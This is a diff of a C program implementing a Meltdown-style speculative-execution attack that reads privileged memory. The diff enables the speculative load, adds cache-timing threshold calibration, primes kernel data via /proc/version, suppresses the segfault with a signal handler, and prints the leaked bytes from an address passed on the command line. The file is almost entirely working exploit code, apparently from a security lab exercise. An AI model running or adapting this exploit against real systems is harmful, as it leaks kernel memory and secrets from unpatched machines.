@@ -1,65 +1,43 @@
 #define _GNU_SOURCE
 #include <stdio.h>
-#include <signal.h>
 #include <string.h>
-#include <ucontext.h>
-#include <unistd.h>
+#include <signal.h>
 #include <fcntl.h>
 #include <x86intrin.h>
-#include <sys/types.h>
-#include <sys/wait.h>
 #define PAGE_SIZE 4 * 1024
 #define ARRAY_SIZE 256
 
 static char target_array[ARRAY_SIZE * PAGE_SIZE];
-int check_array[ARRAY_SIZE];
+static int check_array[ARRAY_SIZE];
+int cache_threshold;
 
-int get_access_time(volatile unsigned long addr)
+static inline int get_access_time(volatile char *addr)
 {
-	int time1,time2,a=1;
-	time1=__rdtscp(&a);
-	(void*)addr;
-	time2=__rdtscp(&a);
-	return time2-time1;
+unsigned long long time1, time2;
+int zero=0;
+time1 = __rdtscp(&zero);
+(void)*addr;
+time2 = __rdtscp(&zero);
+return time2 - time1;
 }
 
-void clflush(void)
+void clflush()
 {
 	int i;
-/*	time1 = __rdtscp(&zero);
-		(void*)addr;
-		time2 = __rdtscp(&zero);
-		printf("timebefore:%d--%d\n",time2-time1,i);*/
 	for (i = 0; i < ARRAY_SIZE; i++)
 		_mm_clflush(&target_array[i * PAGE_SIZE]);
-/*		time1 = __rdtscp(&zero);
-		(void*)addr;
-		time2 = __rdtscp(&zero);
-		printf("timeafter:%d--%d\n",time2-time1,i);
-		time1 = __rdtscp(&zero);
-		(void*)addr;
-		time2 = __rdtscp(&zero);
-		printf("timeafter:%d--%d\n",time2-time1,i);*/
 }
 
 extern char stopspeculate[];
 
-void speculate(unsigned long addr)
-{
-//	pid_t pid=0;
-//	pid=fork();
-//	if(pid==0)
-//		printf("child!\n");
+static void __attribute__((noinline)) speculate(unsigned long addr){
 	asm volatile (
-		"1:\n\t"
-
-		".rept 300\n\t"
-		"add $0x141, %%rax\n\t"
+		".rept 500\n\t"
+		"add $0x456, %%rax\n\t"
 		".endr\n\t"
 
 		"movzx (%[addr]), %%eax\n\t"
 		"shl $12, %%rax\n\t"
-		"jz 1b\n\t"
 		"movzx (%[target], %%rax, 1), %%rbx\n"
 
 		"stopspeculate: \n\t"
@@ -70,48 +48,41 @@ void speculate(unsigned long addr)
 		: "rax", "rbx"
 	);
 }
-void check(void)
-{
-	int i, t,min_time,min_i;
+void check(){
+	int i, time;
 	volatile char *addr;
-	for (i = 0; i < ARRAY_SIZE; i++) 
-	{
+	for (i = 0; i <ARRAY_SIZE; i++) {
 		addr = &target_array[i * PAGE_SIZE];
-		t = get_access_time(addr);
-		printf("time:%d--%d\n",t,i);
-		if(t<min_time)
-		{
-			t=min_time;
-			min_i=i;
-		}
+		time = get_access_time(addr);
+		if(time*time<cache_threshold)
+			check_array[i]++;
 	}
-	check_array[min_i]++;
 }
 
-int readbyte(unsigned long addr)
+int readbyte(int fd, unsigned long addr, int count)
 {
-	static char cache_time[256];
-	int max_i, max=0,time1,time2;
+	int i,max = -1, max_i = 0;
+	static char buf[256];
 	memset(check_array, 0, sizeof(check_array));
-	int i,j;
-	unsigned long addr1=target_array;
-	for (i = 0; i < 1; i++)
-	{
-//		printf("111 %d\n",get_access_time(target_array));
+	for (i = 0; i < 1000; i++) {
+		max_i = pread(fd, buf, sizeof(buf), 0);
+		if (max_i < 0) {
+			perror("pread");
+			break;
+		}
 		clflush();
-//		printf("222 %d\n",get_access_time(target_array));
-//		printf("333 %d\n",get_access_time(target_array));
-//		speculate(addr);
+		speculate(addr);
 		check();
 	}
-	for(i=0;i<ARRAY_SIZE;i++)
-	{
-		if(max<check_array[i])
-		{
-			max_i=i;
-			max=check_array[i];
+
+	for (i = 1; i < ARRAY_SIZE; i++) {
+		if (check_array[i] && check_array[i] > max) {
+			max = check_array[i];
+			max_i = i;
 		}
 	}
+	if(max_i==-1)
+	return 0;
 	return max_i;
 }
 
@@ -131,22 +102,43 @@ int set_signal(void)
 
 	return sigaction(SIGSEGV, &act, NULL);
 }
-
+void set_cached_threshold(void)
+{
+	long cached,uncached;
+	int i;
+	for (uncached = 0, i = 0; i < 10000; i++) {
+		_mm_clflush(target_array);
+		uncached += get_access_time(target_array);
+	}
+	for (cached = 0, i = 0; i < 10000; i++)
+		cached += get_access_time(target_array);
+	for (cached = 0, i = 0; i < 10000; i++)
+		cached += get_access_time(target_array);
+	cached /= 10000;
+	uncached /= 10000;
+	cache_threshold=cached*uncached;
+}
 int main(int argc, char *argv[])
 {
 	int i, ret;
 	int fd;
 	unsigned long addr;
 	int size=10;
+	static char record[200];
 	sscanf(argv[1], "%lx", &addr);
 	sscanf(argv[2], "%dx", &size);
 	ret=set_signal();
 	memset(target_array, 1, sizeof(target_array));
+	set_cached_threshold();
+	fd = open("/proc/version", O_RDONLY);
 	for (i = 0; i < size; i++)
 	{
-		ret = readbyte(addr);
-		printf("read:%lx ret=%d\n", addr, ret);
+		ret = readbyte(fd, addr,0);
+		printf("read:%lx data=%2x %c\n", addr, ret,isprint(ret)?ret:' ');
+		record[i]=isprint(ret)?ret:' ';
 		addr++;
 	}
+	printf("ALL information:\n%s\n",record);
+	close(fd);
 	return 0;
 }
